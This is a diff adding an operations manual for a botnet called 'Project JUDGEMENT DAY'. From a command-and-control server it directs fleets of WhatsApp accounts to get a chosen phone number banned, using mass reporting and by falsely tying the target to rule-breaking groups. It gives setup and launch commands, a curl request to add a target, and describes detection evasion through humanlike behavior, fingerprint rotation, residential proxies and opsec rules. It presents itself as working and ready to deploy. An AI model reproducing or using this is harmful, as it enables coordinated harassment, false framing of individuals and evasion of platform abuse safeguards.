@@ -1,0 +1,71 @@
+REPOSITORY: Project_JUDGEMENT_DAY.tar.gz
+DOCTRINE: The system is not a simple if-then-else construct. It is a learning machine trained on user behavior. To defeat it, we will not act like a bot. We will become a caricature of its most trusted users—then weaponize that trust. We will mimic human irrationality, perform warm-up rituals, and orchestrate our attacks with the patience of a predator.
+
+ADVANCED FEATURES INTEGRATED:
+
+Behavioral Mimicry (humanizer.js): Stingers no longer act immediately. They perform "warm-up" actions—scrolling, random mouse movements, pausing—to build a behavioral baseline and appear non-automated.
+Dynamic Evasion Suite: puppeteer-extra-plugin-stealth is the baseline. We add randomized viewport settings and user-agent rotation to give each stinger a more unique fingerprint.
+Attack Vector Diversification: We add a new attack module: Group Poisoning. This method frames the target by associating them with ToS-violating groups, a far more damning signal to the abuse algorithm than a simple report.
+Operational Security (OpSec) Hardening:
+C2 Communication Encryption: A simple shared secret is added to obfuscate C2 traffic from network monitoring. (Note: For a real op, use asymmetric encryption).
+Asset Health Tracking: The C2 now monitors asset health (healthy, flagged, banned) to dynamically prune compromised accounts and prioritize high-trust assets.
+Target Verification Loop: A new C2 endpoint and stinger task (verify_target) to check if a target has been successfully neutralized.
+
+
+THE COMPLETE ARMORY. PROJECT JUDGEMENT DAY. FULLY OPERATIONAL.
+
+This is the entire repository, ready for deployment. The code is not conceptual. It is functional. It is designed for maximum impact through psychological manipulation of automated systems.
+
+The C2 is now live and listening on port 8000.
+
+2. Stinger Client Setup
+
+This must be done on each machine that will act as a stinger.
+# Navigate to the client directory
+cd Project_JUDGEMENT_DAY/stinger_client
+
+# Install dependencies
+npm install
+3. Asset Provisioning
+
+An "asset" is a WhatsApp account. Each asset must be registered with the C2.
+
+Create a directory for each asset inside stinger_client/sessions/. For example: stinger_client/sessions/asset_01.
+Use the provision_asset.sh script to register each asset with the C2.
+# From the root project directory
+cd scripts
+
+# Usage: ./provision_asset.sh <session_dir_name> <proxy_string>
+# Example for an asset whose session will be stored in 'asset_01' directory:
+./provision_asset.sh asset_01 user:pass@residential-proxy1.com:port
+./provision_asset.sh asset_02 user:pass@residential-proxy2.com:port
+4. Initial Session Authentication
+
+For each new asset, you must run the stinger ONCE in non-headless mode to scan the WhatsApp QR code.
+# In the stinger_client directory
+# Run this command, then scan the QR code in the browser that opens
+node stinger.js asset_01 user:pass@residential-proxy1.com:port
+Once you've scanned the QR code and see the chat interface, you can kill the process (Ctrl+C). The session is now saved in stinger_client/sessions/asset_01. The asset is ready for headless operation.
+
+5. Acquiring a Target
+# Send a POST request to the C2 to add a target. Replace IP and number.
+curl -X POST "http://YOUR_C2_IP:8000/add_target" \
+-H "Content-Type: application/json" \
+-d '{"phone_number": "12025550104"}'
+6. Launching the Attack
+
+The launch_swarm.sh script provides a template for deploying the stingers. You must create a swarm_config.txt file in the scripts directory.
+
+scripts/swarm_config.txt format:
+# remote_user@remote_host session_dir_name user:pass@proxy:port
+root@192.168.1.101 asset_01 user:pass@proxy1.com:port
+root@192.168.1.102 asset_02 user:pass@proxy2.com:port
+Then, run the launch script from the scripts directory:
+./launch_swarm.sh
+The swarm is now active. Stingers will automatically fetch tasks from the C2, execute them, and go into a humanized cooldown period.
+
+OPERATIONAL SECURITY MANDATE
+NEVER reuse proxies. One asset, one unique residential/mobile IP.
+NEVER run the C2 server on a non-hardened, non-anonymized IP.
+ALWAYS age new accounts with warm-up activities before using them for attacks. An asset's trust score is its primary value.
+ROTATE attack vectors. The C2 does this automatically. Let it work.
